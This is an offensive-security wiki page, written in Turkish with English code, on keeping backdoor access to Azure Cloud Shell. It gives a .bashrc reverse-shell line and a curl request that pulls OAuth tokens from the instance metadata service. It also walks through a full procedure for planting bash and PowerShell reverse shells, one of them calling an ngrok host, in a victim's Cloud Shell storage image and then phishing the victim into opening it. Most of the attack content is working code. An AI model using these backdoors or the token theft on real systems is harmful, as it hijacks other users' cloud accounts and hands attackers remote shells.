# Az - Cloud Shell Persistence

{{#include ../../../banners/hacktricks-training.md}}

## Cloud Shell Persistence

Azure Cloud Shell, Azure kaynaklarını yönetmek için kalıcı depolama ve otomatik kimlik doğrulama ile komut satırı erişimi sunar. Saldırganlar, kalıcı ana dizine arka kapılar yerleştirerek bunu istismar edebilir:

* **Kalıcı Depolama**: Azure Cloud Shell’in ana dizini, bir Azure dosya paylaşımına monte edilir ve oturum sona erdikten sonra bile sağlam kalır.
* **Başlangıç Betikleri**: `.bashrc` veya `config/PowerShell/Microsoft.PowerShell_profile.ps1` gibi dosyalar, her oturumun başlangıcında otomatik olarak çalıştırılır ve bulut kabuğu başladığında kalıcı yürütme sağlar.

Example backdoor in .bashrc:
```bash
echo '(nohup /usr/bin/env /bin/bash 2>/dev/null -norc -noprofile >& /dev/tcp/$CCSERVER/443 0>&1 &)' >> $HOME/.bashrc
```
Bu arka kapı, kullanıcı tarafından bulut kabuğu tamamlandıktan 5 dakika sonra bile komutları çalıştırabilir.

Ayrıca, örnek ayrıntıları ve token'lar için Azure'un meta veri hizmetini sorgulayın:
```bash
curl -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" -s
```
### Cloud Shell Phishing

Eğer bir saldırgan, yazma ve okuma erişimine sahip olduğu bir Storage Account'ta diğer kullanıcıların görüntülerini bulursa, görüntüyü indirebilir, **içine bir bash ve PS arka kapı ekleyebilir** ve tekrar Storage Account'a yükleyebilir, böylece kullanıcı shell'e eriştiğinde **komutlar otomatik olarak çalıştırılacaktır**.

- **Görüntüyü indir, arka kapıyı ekle ve yükle:**
```bash
# Download image
mkdir /tmp/phishing_img
az storage file download-batch -d /tmp/phishing_img --account-name <acc-name> -s <file-share>

# Mount the image
mkdir /tmp/backdoor_img
sudo mount ./.cloudconsole/acc_carlos.img /tmp/backdoor_img
cd /tmp/backdoor_img

# Create backdoor
mkdir .config
mkdir .config/PowerShell
touch .config/PowerShell/Microsoft.PowerShell_profile.ps1
chmod 777 .config/PowerShell/Microsoft.PowerShell_profile.ps1

# Bash backdoor
echo '(nohup /usr/bin/env /bin/bash 2>/dev/null -norc -noprofile >& /dev/tcp/${SERVER}/${PORT} 0>&1 &)' >> .bashrc

# PS backdoor
echo '$client = New-Object System.Net.Sockets.TCPClient("7.tcp.eu.ngrok.io",19838);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' >> .config/PowerShell/Microsoft.PowerShell_profile.ps1

# Unmount
cd /tmp
sudo umount /tmp/backdoor_img

# Upload image
az storage file upload --account-name <acc-name> --path ".cloudconsole/acc_username.img" --source "./tmp/phishing_img/.cloudconsole/acc_username.img" -s <file-share>
```
- **Sonra, kullanıcının https://shell.azure.com/ adresine erişmesi için oltalama yapın.**


{{#include ../../../banners/hacktricks-training.md}}
